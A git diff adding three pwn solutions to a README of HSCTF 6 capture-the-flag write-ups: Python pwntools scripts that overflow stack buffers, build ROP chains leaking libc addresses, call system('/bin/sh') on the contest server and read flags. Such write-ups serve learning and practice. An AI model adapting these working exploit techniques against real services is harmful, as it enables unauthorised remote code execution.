@@ -9,6 +9,9 @@ A bunch of write-ups for HSCTF 6 which I participated in this year. The write-up
 |[English Sucks](#english-sucks)|misc|497pts|8|
 |[bit](#bit)|pwn|401pts|76|
 |[combo-chain](#combo-chain)|pwn|368pts|102|
+|[combo-chain-lite](#combo-chain-lite)|pwn|...|...|
+|[storytime](#storytime)|pwn|...|...|
+|[return-to-sender](#return-to-sender)|pwn|...|...|
 
 # English Sucks
 
@@ -255,6 +258,44 @@ p.interactive()
 p.close()
 ```
 
+## combo-chain-lite
+
+```python
+#!/usr/bin/python2
+
+#
+# $ python get.py
+# [+] Opening connection to pwn.hsctf.com on port 3131: Done
+# [*] system: 0x7f01a1c16390
+#
+# Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!:
+# [*] Switching to interactive mode
+# $ cat flag
+# hsctf{wheeeeeee_that_was_fun}
+#
+
+from pwn import *
+
+# p = process('./combo-chain-lite')
+p = remote('pwn.hsctf.com', 3131)
+
+p.recvuntil('computer: ')
+system = int(p.recv(14), 16)
+
+log.info('system: {}'.format(hex(system)))
+
+payload = '//bin/sh##AAAAAA'
+payload += p64(0x00401273)
+payload += p64(0x00402051)
+payload += p64(system)
+
+print p.recvuntil('COMBO CARNAGE!: ')
+
+p.sendline(payload)
+p.interactive()
+p.close()
+```
+
 ## bit
 
 We want to overwrite the global offset table entry for `exit` with the address of `flag`.
@@ -292,4 +333,91 @@ Well, at least you tried.
 [🛐] pwn gods like you deserve this: hsctf{flippin_pwn_g0d}
 ```
 
+## storytime
 
+```python
+#!/usr/bin/python2
+
+#
+# $ ./find write 2b0
+# ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
+# $ ./dump libc6_2.23-0ubuntu10_amd64
+# offset___libc_start_main_ret = 0x20830
+# offset_system = 0x0000000000045390
+# offset_dup2 = 0x00000000000f7970
+# offset_read = 0x00000000000f7250
+# offset_write = 0x00000000000f72b0
+# offset_str_bin_sh = 0x18cd57
+#
+# $ python get.py
+# [+] Opening connection to pwn.hsctf.com on port 3333: Done
+# [*] write @ 0x7fc42eb6c2b0
+# [*] Switching to interactive mode
+# $ ls
+# bin
+# dev
+# flag
+# lib
+# lib32
+# lib64
+# storytime
+# $ cat flag
+# hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
+#
+
+from pwn import *
+
+p = remote('pwn.hsctf.com', 3333)
+
+p.recvuntil('story: \n')
+
+# The first stage is leaking the address of write in libc.
+payload = 'A' * 56
+payload += p64(0x00400703)  # pop rdi; ret;
+payload += p64(0x1)         # rdi = 0x1
+payload += p64(0x00400701)  # pop rsi; pop r15; ret;
+payload += p64(0x00601018)  # rsi = write@got.plt
+payload += p64(0x00000000)  # r15 = 0x0
+payload += p64(0x4004a0)    # call write(rdi, rsi, rdx)
+payload += p64(0x40062e)    # main()
+
+p.sendline(payload)
+
+write = u64(p.recv(8))
+log.info('write @ {}'.format(hex(write)))
+
+p.recvuntil('story: \n')
+
+payload = 'A' * 56
+payload += p64(0x00400703)      # pop rdi; ret;
+payload += p64(write + 0x95aa7) # rsi = &"/bin/sh"
+payload += p64(write - 0xb1f20) # system(rsi)
+
+p.sendline(payload)
+p.interactive()
+p.close()
+```
+
+## return-to-sender
+
+```python
+#!/usr/bin/python2
+
+from pwn import *
+
+#
+# $ python get.py
+# [+] Opening connection to pwn.hsctf.com on port 1234: Done
+# [*] Switching to interactive mode
+# Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAABBBB\xb6\x91\x0 it goes!
+# $ cat flag
+# hsctf{fedex_dont_fail_me_now}
+# $
+
+#p = process('./return-to-sender')
+p = remote('pwn.hsctf.com', 1234)
+
+p.sendline('A' * 16 + 'B' * 4 + p32(0x080491b6))
+p.interactive()
+p.close()
+```
